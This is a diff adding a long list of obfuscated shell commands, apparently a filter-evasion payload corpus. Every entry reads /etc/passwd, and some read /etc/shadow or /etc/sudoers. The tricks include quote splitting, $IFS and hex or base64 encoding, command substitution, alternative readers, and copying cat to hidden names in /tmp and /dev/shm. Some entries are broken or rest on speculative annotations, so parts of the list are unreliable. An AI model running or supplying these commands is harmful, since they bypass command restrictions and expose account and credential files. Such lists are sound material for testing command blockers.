@@ -1,0 +1,360 @@
+/usr/bin/cat /etc//passwd
+/usr/bin/cat /etc/./passwd
+/usr/bin/cat /etc/passwd/../passwd
+/usr/bin/cat /etc/././passwd
+/usr/bin/cat /etc/../etc/passwd
+/usr/bin/cat /etc/pa""sswd
+/usr/bin/cat /etc/pas'/'swd
+/usr/bin/cat /etc/pas"./"swd
+/usr/bin/cat /etc/pa$'sswd'
+/usr/bin/cat /etc/pas\sw\wd
+`/usr/bin/cat /etc/${PATH##*/}passwd` *(assuming `PATH` includes etc/)*
+/usr/bin/cat /etc/pas\.\.swd
+/usr/bin/cat /etc/passwd\
+`/usr/bin/cat /etc/pas\twd` *(tab character)*
+`/usr/bin/cat /etc/pas\0x73wd` *(hex escape for 's')*
+/usr/bin/cat /etc/pa""s""swd
+/usr/bin/cat /etc/passwd#
+/usr/bin/cat '/etc/'passwd
+/usr/bin/cat "/etc"/passwd
+/usr/bin/cat /et''c/passwd
+/usr/bin/cat /etc/passwd%00
+`/usr/bin/cat /et<c>/passwd` *(assuming c is replaced at runtime)*
+/usr/bin/cat /etc/passwd%20
+/usr/bin/cat /etc/pa\x73swd
+/usr/bin/cat /etc/pas${IFS}swd
+/usr/bin/cat /e\etc/passwd
+/usr/bin/cat /etc/passwd$IFS
+/usr/bin/cat /etc/.passwd
+`/usr/bin/cat /etc/%70asswd` *(URL-encoded p)*
+/usr/bin/cat /etc/passwd?
+/usr/bin/cat /etc/pas'_'swd
+/usr/bin/cat /etc/pa\\sswd
+/usr/bin/cat /etc//./passwd
+/usr/bin/cat /etc/passwd\\
+/usr/bin/cat /etc///passwd
+`/usr/bin/cat /etc/pas$((1+1))swd` *(arithmetic insertion)*
+/usr/bin/cat /etc/pas$RANDOMswd
+`/usr/bin/cat /etc/pas<tab>swd` *(with literal tab character)*
+`/usr/bin/cat /etc/pas\u0073swd` *(Unicode escape for 's')*
+/usr/bin/cat /etc/pa""ss""wd
+/usr/bin/cat "/etc/pa""sswd"
+/usr/bin/cat /etc"/"passwd
+/usr/bin/cat /et/c/passwd
+`/usr/bin/cat /etc/pa'$'\163''swd` *(shell style escaped 's')*
+`/usr/bin/cat /etc/pas--swd` *(double dash, might be ignored)*
+/usr/bin/cat /etc/pas../swd
+/usr/bin/cat /etc/pa$'ss'wd
+/usr/bin/cat /etc/passwd%%
+/usr/bin/cat /etc/passwd$'\n'
+`/usr/bin/cat /etc/${USER}passwd` *(if USER is empty or etc)*
+/usr/bin/cat /et""c/passwd
+/usr/bin/cat /etc/passwd\?debug=true
+/usr/bin/cat /etc/passwd%2F
+`/usr/bin/cat /etc/passwd%252F` *(double encoded slash)*
+/usr/bin/cat "/etc//passwd"
+/usr/bin/cat /e///tc//passwd
+/usr/bin/cat /etc/pas""sw""d
+/usr/bin/cat /etc/pa'$'sswd
+/usr/bin/cat "/etc"/"./passwd"
+/usr/bin/cat /etc/pa\\ss\\wd
+/usr/bin/awk 1 /etc/passwd
+/usr/bin/awk '{print}' /etc/passwd
+/usr/bin/grep "" /etc/passwd
+/usr/bin/grep . /etc/passwd
+/usr/bin/grep root /etc/passwd
+/usr/bin/sed '' /etc/passwd
+/usr/bin/sed -n 'p' /etc/passwd
+/usr/bin/sed -e '' /etc/passwd
+/usr/bin/nl /etc/passwd
+/usr/bin/tac /etc/passwd
+/usr/bin/rev /etc/passwd
+/usr/bin/less /etc/passwd
+/usr/bin/head -n 100 /etc/passwd
+/usr/bin/tail -n +1 /etc/passwd
+/usr/bin/more /etc/passwd
+/usr/bin/vi /etc/passwd
+/usr/bin/vim -c ':q' /etc/passwd
+/usr/bin/emacs -batch /etc/passwd
+/usr/bin/xxd /etc/passwd
+/usr/bin/hexdump /etc/passwd
+/usr/bin/strings /etc/passwd
+/usr/bin/base64 /etc/passwd
+/usr/bin/cut -d: -f1 /etc/passwd
+/usr/bin/tr -d '\n' < /etc/passwd
+/usr/bin/od -c /etc/passwd
+/usr/bin/wc -l /etc/passwd
+/usr/bin/cp /etc/passwd /tmp/passwd && /usr/bin/awk 1 /tmp/passwd
+/usr/bin/tee /dev/null < /etc/passwd
+/usr/bin/sort /etc/passwd
+/usr/bin/uniq /etc/passwd
+/usr/bin/awk '{system("echo " $0)}' /etc/passwd
+/usr/bin/awk '{print $0}' /etc/passwd
+/usr/bin/grep -v '^$' /etc/passwd
+/usr/bin/grep -E '.' /etc/passwd
+/usr/bin/sed -n '1,$p' /etc/passwd
+/usr/bin/sed -e 's/^.*$/&/' /etc/passwd
+/usr/bin/tr -s '\n' '\n' < /etc/passwd
+/usr/bin/head /etc/passwd
+/usr/bin/tail /etc/passwd
+/usr/bin/less +F /etc/passwd
+/usr/bin/more < /etc/passwd
+/usr/bin/vi +q /etc/passwd
+/usr/bin/vim +q /etc/passwd
+/usr/bin/emacs --batch /etc/passwd
+/usr/bin/xxd -r -p <<< $(xxd -p /etc/passwd)
+/usr/bin/od -An -tx1 /etc/passwd
+/usr/bin/wc /etc/passwd
+/usr/bin/strings < /etc/passwd
+/usr/bin/tee /tmp/tmpfile < /etc/passwd
+/usr/bin/nl -ba /etc/passwd
+/usr/bin/sort < /etc/passwd
+/usr/bin/uniq < /etc/passwd
+/usr/bin/csplit /etc/passwd 1
+/usr/bin/awk 'length > 0' /etc/passwd
+/usr/bin/paste /etc/passwd
+/usr/bin/yes | /usr/bin/head -n $(wc -l < /etc/passwd)
+/usr/bin/fmt -w 1000 /etc/passwd
+/usr/bin/cksum /etc/passwd
+/usr/bin/cmp /etc/passwd /etc/passwd
+/usr/bin/diff /etc/passwd /etc/passwd
+/usr/bin/cat /etc/passw
+/usr/bin/cat /etc//passwd
+/usr/bin/cat /etc/./passwd
+/usr/bin/cat /etc/passwd~
+/usr/bin/cat /etc/passwd.bak
+/usr/bin/cat /etc/*passwd
+/usr/bin/cat /etc/paswd
+/usr/bin/cat /etc/passd
+/usr/bin/cat /etc/pass
+/usr/bin/cat /etc/p@sswd
+/usr/bin/cat /etc/.passwd
+/usr/bin/cat /etc//./passwd
+/usr/bin/cat /etc/passwd\
+/usr/bin/cat /etc/pwd.db
+/usr/bin/cat /etc/master.passwd
+/usr/bin/cat /etc/spwd.db
+/usr/bin/cat /etc/shadow
+/usr/bin/cat /etc/shad0w
+/usr/bin/cat /etc/shadow\
+/usr/bin/cat /etc/shadow~
+/usr/bin/cat /etc/shadow.bak
+/usr/bin/cat /etc/*shadow
+/usr/bin/cat /etc/sudoers
+/usr/bin/cat /etc/sudoers~
+/usr/bin/cat /etc/sudoers.bak
+/usr/bin/cat /etc/*sudoers
+/usr/bin/cat /etc/pwd.d*
+/usr/bin/cat /etc/passwd | head -n 10
+/usr/bin/cat </etc/passwd
+cat /etc/passwd
+cat /etc//passwd
+cat /etc/./passwd
+cat //etc/passwd
+cat /etc/pas\sw\ d
+cat /etc/pass\wd
+cat /etc/passwd#
+cat /etc/passwd.txt
+cat /etc/passwd.old
+cat /etc/passwd.backup
+cat /etc/passwd_
+cat /etc/././passwd
+cat /etc//passwd/../passwd
+cat /etc/pa../passwd
+cat /etc/.//passwd
+cat "$(echo /etc/passwd)"
+cat $(echo /etc/passwd)
+cat </etc//passwd
+cat<<<"/etc/passwd"
+cat</etc/passwd
+cat /etc/$USER/../passwd
+cat /e*/pass*
+cat /etc/pa*wd
+cat /etc/p??swd
+cat /etc/passwd|cat
+cat /etc/passwd | tail -n +1
+cat /etc/./././passwd
+cat /e*/p*wd
+cat /etc/$(echo passwd)
+cat /etc/$(printf 'passw\144')
+cat $(find /etc -name "passwd")
+/etc/passwd | /usr/bin/cat
+cat /etc/passwd
+/bin/cat /etc/passwd
+cat /etc/passwd > /dev/stdout
+</etc/passwd /usr/bin/cat
+>/dev/null /usr/bin/cat /etc/passwd
+echo /etc/passwd | xargs /usr/bin/cat
+xargs /usr/bin/cat <<< "/etc/passwd"
+for i in /etc/passwd; do /usr/bin/cat $i; done
+FILE=/etc/passwd; /usr/bin/cat $FILE
+CMD="/usr/bin/cat"; $CMD /etc/passwd
+ARGS="/etc/passwd"; /usr/bin/cat $ARGS
+/usr/bin/cat </etc/passwd
+/usr/bin/cat $(echo /etc/passwd)
+readlink -f /etc/passwd | xargs /usr/bin/cat
+printf "/etc/passwd\n" | xargs /usr/bin/cat
+/usr/bin/cat` echo /etc/passwd`
+ls /etc | grep passwd | xargs -I{} /usr/bin/cat /etc/{}
+/usr/bin/cat $(ls /etc/passwd)
+find /etc -name passwd -exec /usr/bin/cat {} \;
+cd /etc && /usr/bin/cat passwd
+/usr/bin/cat $(cd /etc && pwd)/passwd
+eval "/usr/bin/cat /etc/passwd"
+IFS= read -r path <<< "/etc/passwd"; /usr/bin/cat $path
+bash -c '/usr/bin/cat /etc/passwd'
+command cat /etc/passwd
+which cat | xargs -I{} {} /etc/passwd
+env PATH=/usr/bin:$PATH cat /etc/passwd
+$(which cat) /etc/passwd
+nice /usr/bin/cat /etc/passwd
+cat < /etc/passwd
+/etc/passwd | cat
+exec cat /etc/passwd
+{ cat /etc/passwd; }
+(cat /etc/passwd)
+set -- /etc/passwd; cat "$1"
+while read -r l; do echo "$l"; done < /etc/passwd
+awk '{print}' /etc/passwd
+sed -n '1,$p' /etc/passwd
+paste /etc/passwd
+nl /etc/passwd | cut -f2-
+cut -d: -f1-7 /etc/passwd
+perl -ne 'print' /etc/passwd
+python3 - <<'EOF'\nprint(open("/etc/passwd").read())\nEOF
+ruby -e 'puts File.read("/etc/passwd")'
+tail -n +1 /etc/passwd
+head -n 9999 /etc/passwd
+more /etc/passwd
+less /etc/passwd
+vi -c '%p|q!' /etc/passwd
+vim -es +'w! /dev/stdout' +q /etc/passwd
+ed -s /etc/passwd <<< '1,$p\nq'
+strings /etc/passwd
+dd if=/etc/passwd bs=1
+hexdump -Cv /etc/passwd | sed 's/^.* //;s/ .*//'
+od -An -c /etc/passwd | tr -d ' '
+awk 1 /etc/passwd
+sed '' /etc/passwd
+xargs -n1 echo < /etc/passwd
+cat $(printf "/etc/passwd")
+/usr/bin/cat /etc//passwd
+/usr/bin/cat /etc/./passwd
+/usr/bin/cat /e\tc/passwd
+/usr/bin/cat /etc/pas$'\x73'wd
+/usr/bin/cat $'/etc/pas\163wd'
+/usr/bin/cat /etc/pa\115wd
+/usr/bin/cat $(echo /etc/passwd)
+/usr/bin/cat $(echo -n /etc/passwd)
+/usr/bin/cat $(printf /etc/%spasswd '' )
+/usr/bin/cat $(echo -e "/etc/pas\x73wd")
+/usr/bin/cat /etc/pas'"'"'swd
+/usr/bin/cat "/etc/pas""swd"
+/usr/bin/cat '/etc/pas''swd'
+/usr/bin/cat $'/etc/passwd'
+/usr/bin/cat /et''c/passwd
+/usr/bin/cat /etc${IFS}passwd
+/usr/bin/cat /etc/pa${IFS}sswd
+/usr/bin/cat "/e""tc""/passwd"
+/usr/bin/cat '/et'c'/passwd'
+/usr/bin/cat /etc/pa\x73swd
+/usr/bin/cat /etc/p\x61sswd
+/usr/bin/cat /etc/pa\163\163wd
+/usr/bin/cat /etc/pa\u0073\u0073wd
+/usr/bin/cat $(cat <<< "/etc/passwd")
+/usr/bin/cat "$(cat <<< /etc/pas"swd)"
+/usr/bin/cat /e\164c/passwd
+/usr/bin/cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+/usr/bin/cat "$(echo L2V0Yy9wYXNzd2QK | base64 -d)"
+/usr/bin/cat "$(python3 -c 'print("/etc/passwd")')"
+/usr/bin/cat $(perl -e 'print "/etc/passwd"')
+/usr/bin/cat /etc/pa\163\163\167d
+`/usr/bin/cat /etc/$((0+112))asswd` # p = 112
+/usr/bin/cat /etc/$'pa\163\163wd'
+/usr/bin/cat /etc/pas\163wd
+/usr/bin/cat $(tr -d '\n' <<< '/etc/passwd')
+/usr/bin/cat $(cut -d ':' -f 1 <<< '/etc/passwd:dummy')
+/usr/bin/cat $(echo -n "/etc/p" && echo "asswd")
+/usr/bin/cat $(echo -e "/etc/\x70asswd")
+/usr/bin/cat /e\057c/passwd
+/usr/bin/cat "$(perl -e 'print q#/etc/passwd#')"
+/usr/bin/cat "$(echo /etc | sed 's/$/\/passwd/')"
+/usr/bin/cat /etc/$(echo passwd)
+/usr/bin/cat /et$(echo c)/passwd
+/usr/bin/cat /etc/pa$(echo sswd)
+/usr/bin/cat /etc/$(printf 'pass')wd
+/usr/bin/cat $(echo / | tr -d '\n')etc/passwd
+/usr/bin/cat /et$(cut -c1 <<< c)/passwd
+/usr/bin/cat /etc/p$(cut -c1-5 <<< 'asswd')
+/usr/bin/cat /etc/${PATH:0:0}passwd
+/usr/bin/cat "$(awk 'BEGIN{print "/etc/passwd"}')"
+/usr/bin/cat $(<<END /etc/passwd END )
+/usr/bin/cat /e$(echo tc)/passwd
+/usr/bin/cat $(dirname /etc/passwd)/passwd
+/usr/bin/cat "/et""c"/pa"sswd"
+/usr/bin/cat /etc/pas""swd
+/usr/bin/cat /e/../etc/passwd
+/usr/bin/cat $PWD/../etc/passwd
+/usr/bin/cat /etc/$(cat <<< "passwd")
+/usr/bin/cat "$(echo -n '/etc/passwd')"
+/usr/bin/cat "$(echo L2V0Yy9wYXNzd2QK | base64 -d | tr -d '\n')"
+cp /usr/bin/cat /tmp/a; /tmp/a /etc/passwd
+cp /usr/bin/cat /dev/shm/cat2; /dev/shm/cat2 /etc/passwd
+cp /usr/bin/cat /var/tmp/readfile; /var/tmp/readfile /etc/passwd
+cp /usr/bin/cat /tmp/.hidden; /tmp/.hidden /etc/passwd
+install /usr/bin/cat /tmp/cattest; /tmp/cattest /etc/passwd
+cp /usr/bin/cat /tmp/.c@t; /tmp/.c@t /etc/passwd
+cp /usr/bin/cat /dev/mqueue/mc; /dev/mqueue/mc /etc/passwd
+cp /usr/bin/cat /tmp/.x; /tmp/.x /etc/passwd
+cp /usr/bin/cat /run/catx; /run/catx /etc/passwd
+cp /usr/bin/cat ./cat_copy; ./cat_copy /etc/passwd
+cp /usr/bin/cat ~/cat_bin; ~/cat_bin /etc/passwd
+cp /usr/bin/cat /tmp/reader; /tmp/reader /etc/passwd
+cp /usr/bin/cat /tmp/cat1; nohup /tmp/cat1 /etc/passwd
+cp /usr/bin/cat /dev/shm/.tmp_cat; /dev/shm/.tmp_cat /etc/passwd
+cp /usr/bin/cat /tmp/meow; /tmp/meow /etc/passwd
+cp /usr/bin/cat /tmp/bin.sh; /tmp/bin.sh /etc/passwd
+cp /usr/bin/cat /opt/catlog; /opt/catlog /etc/passwd
+cp /usr/bin/cat /var/tmp/xcat; /var/tmp/xcat /etc/passwd
+cp /usr/bin/cat /tmp/runner; /tmp/runner /etc/passwd
+cp /usr/bin/cat /home/user/.xrcat; /home/user/.xrcat /etc/passwd
+cp /usr/bin/cat /tmp/pwdviewer; /tmp/pwdviewer /etc/passwd
+cp /usr/bin/cat /tmp/.exec; /tmp/.exec /etc/passwd
+cp /usr/bin/cat /tmp/passreader; /tmp/passreader /etc/passwd
+cp /usr/bin/cat /tmp/.a; /tmp/.a /etc/passwd
+cp /usr/bin/cat /tmp/binread; /tmp/binread /etc/passwd
+cp /usr/bin/cat /tmp/myreader; /tmp/myreader /etc/passwd
+cp /usr/bin/cat /tmp/.run; /tmp/.run /etc/passwd
+cp /usr/bin/cat /tmp/viewer; /tmp/viewer /etc/passwd
+cp /usr/bin/cat /var/tmp/xread; /var/tmp/xread /etc/passwd
+cp /usr/bin/cat /tmp/xy123; /tmp/xy123 /etc/passwd
+cp /usr/bin/cat /tmp/.binx; /tmp/.binx /etc/passwd
+cp /usr/bin/cat /tmp/cat_copy1; /tmp/cat_copy1 /etc/passwd
+cp /usr/bin/cat /tmp/.passwdreader; /tmp/.passwdreader /etc/passwd
+cp /usr/bin/cat /dev/shm/hidden_cat; /dev/shm/hidden_cat /etc/passwd
+cp /usr/bin/cat /var/tmp/dumpcat; /var/tmp/dumpcat /etc/passwd
+cp /usr/bin/cat /tmp/.xx; /tmp/.xx /etc/passwd
+cp /usr/bin/cat /tmp/b64; /tmp/b64 /etc/passwd
+cp /usr/bin/cat /tmp/zz; /tmp/zz /etc/passwd
+cp /usr/bin/cat /var/tmp/viewcat; /var/tmp/viewcat /etc/passwd
+cp /usr/bin/cat /tmp/.reader; /tmp/.reader /etc/passwd
+cp /usr/bin/cat /tmp/.mypipe; /tmp/.mypipe /etc/passwd
+cp /usr/bin/cat /tmp/a.out; /tmp/a.out /etc/passwd
+cp /usr/bin/cat /tmp/exec_bin; /tmp/exec_bin /etc/passwd
+cp /usr/bin/cat /var/tmp/.tmp123; /var/tmp/.tmp123 /etc/passwd
+cp /usr/bin/cat /tmp/my.bin; /tmp/my.bin /etc/passwd
+cp /usr/bin/cat /dev/shm/.shellbin; /dev/shm/.shellbin /etc/passwd
+cp /usr/bin/cat /tmp/shadowread; /tmp/shadowread /etc/passwd
+cp /usr/bin/cat /run/user/readme; /run/user/readme /etc/passwd
+cp /usr/bin/cat /tmp/fetch; /tmp/fetch /etc/passwd
+cp /usr/bin/cat /tmp/ls_fake; /tmp/ls_fake /etc/passwd
+cp /usr/bin/cat /tmp/sneakycat; /tmp/sneakycat /etc/passwd
+cp /usr/bin/cat /tmp/.stealth; /tmp/.stealth /etc/passwd
+cp /usr/bin/cat /var/tmp/tmp.cat; /var/tmp/tmp.cat /etc/passwd
+cp /usr/bin/cat /tmp/cat_renamed; /tmp/cat_renamed /etc/passwd
+cp /usr/bin/cat /tmp/userinfo; /tmp/userinfo /etc/passwd
+cp /usr/bin/cat /tmp/.runme; /tmp/.runme /etc/passwd
+cp /usr/bin/cat /tmp/.bin_cat; /tmp/.bin_cat /etc/passwd
+cp /usr/bin/cat /tmp/xxcatxx; /tmp/xxcatxx /etc/passwd
+cp /usr/bin/cat /tmp/nano_reader; /tmp/nano_reader /etc/passwd
+cp /usr/bin/cat /tmp/getpass; /tmp/getpass /etc/passwd
